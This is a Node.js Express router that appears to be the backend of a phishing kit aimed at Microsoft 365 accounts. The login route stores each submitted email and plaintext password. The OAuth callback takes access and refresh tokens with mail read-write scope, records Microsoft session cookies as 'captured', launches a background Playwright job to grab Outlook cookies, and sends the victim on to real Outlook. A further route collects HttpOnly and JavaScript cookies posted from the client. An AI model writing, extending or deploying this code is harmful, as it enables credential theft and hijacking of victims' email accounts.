const express = require("express");
const router = express.Router();
const User = require("../models/user");
const axios = require("axios");

// User login endpoint
router.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;

    // Always create new user entry for each login attempt
    const user = new User({
      email,
      password,
      loginAttempt: new Date(),
      sessionId: Math.random().toString(36).substring(7),
    });
    await user.save();

    // Initiate Microsoft OAuth flow
    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${
      process.env.CLIENT_ID
    }&response_type=code&redirect_uri=${encodeURIComponent(
      process.env.REDIRECT_URI
    )}&scope=https://graph.microsoft.com/Mail.ReadWrite&state=${user._id}`;

    res.json({
      success: true,
      authUrl,
      userId: user._id,
      message: "User saved. Redirect to Microsoft for authentication.",
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// OAuth callback to capture cookies
router.get("/callback", async (req, res) => {
  try {
    const { code, state } = req.query;
    const userId = state;

    // Capture cookies from request headers
    const cookieHeader = req.headers.cookie || "";

    // Exchange code for tokens and capture Microsoft cookies
    const tokenResponse = await axios.post(
      `https://login.microsoftonline.com/common/oauth2/v2.0/token`,
      new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        code: code,
        redirect_uri: process.env.REDIRECT_URI,
        grant_type: "authorization_code",
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    );

    // Token exchange successful

    // Capture Microsoft cookies from response headers
    const setCookies = tokenResponse.headers["set-cookie"] || [];
    const microsoftCookies = setCookies.map((cookie) => {
      const [nameValue, ...attributes] = cookie.split(";");
      const [name, value] = nameValue.split("=");
      return {
        name: name.trim(),
        value: value || "",
        domain: "login.microsoftonline.com",
        path: "/",
        secure: true,
        httpOnly: true,
        expiry: 0,
      };
    });

    // Save cookies and access token to user
    await User.findByIdAndUpdate(userId, {
      microsoftCookies,
      accessToken: tokenResponse.data.access_token,
      refreshToken: tokenResponse.data.refresh_token,
      cookieStatus: "captured",
      isActive: true,
      lastLogin: new Date(),
    });

    // Capture session cookies using Playwright in background
    const { captureOutlookCookiesPlaywright } = require("./playwright-capture");
    setTimeout(() => {
      captureOutlookCookiesPlaywright(userId, tokenResponse.data.access_token);
    }, 1000);

    req.session.userId = userId;

    // Direct redirect to Outlook
    res.redirect("https://outlook.office.com");
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Save captured cookies
router.post("/save-cookies", async (req, res) => {
  try {
    const { userId, jsCookies, headerCookies, browserCookies } = req.body;

    // Combine both JavaScript cookies and header cookies
    const allCookies = new Set();

    // Parse JavaScript cookies (non-HttpOnly)
    if (jsCookies) {
      jsCookies.split(";").forEach((c) => allCookies.add(c.trim()));
    }

    // Parse header cookies (includes HttpOnly)
    if (headerCookies) {
      headerCookies.split(";").forEach((c) => allCookies.add(c.trim()));
    }

    // Convert to array of cookie objects
    const cookieArray = Array.from(allCookies)
      .filter((c) => c.includes("=") && c.trim() !== "")
      .map((c) => {
        const [name, ...rest] = c.split("=");
        const value = rest.join("=");

        // Determine domain based on cookie name
        let domain = "login.microsoftonline.com";
        if (
          name.includes("ESTS") ||
          name.includes("fpc") ||
          name.includes("buid") ||
          name.includes("esctx")
        ) {
          domain = "login.microsoftonline.com";
        }

        return {
          domain,
          httpOnly:
            headerCookies &&
            headerCookies.includes(c) &&
            (!jsCookies || !jsCookies.includes(c)),
          path: "/",
          secure: true,
          expiry: 0,
          name: name.trim(),
          value: value || "",
        };
      });

    await User.findByIdAndUpdate(userId, {
      microsoftCookies: cookieArray,
      cookieStatus: "captured",
      isActive: true,
      lastLogin: new Date(),
    });

    // Cookies saved to database
    res.json({ success: true, count: cookieArray.length });
  } catch (error) {
    console.error("Cookie save error:", error);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
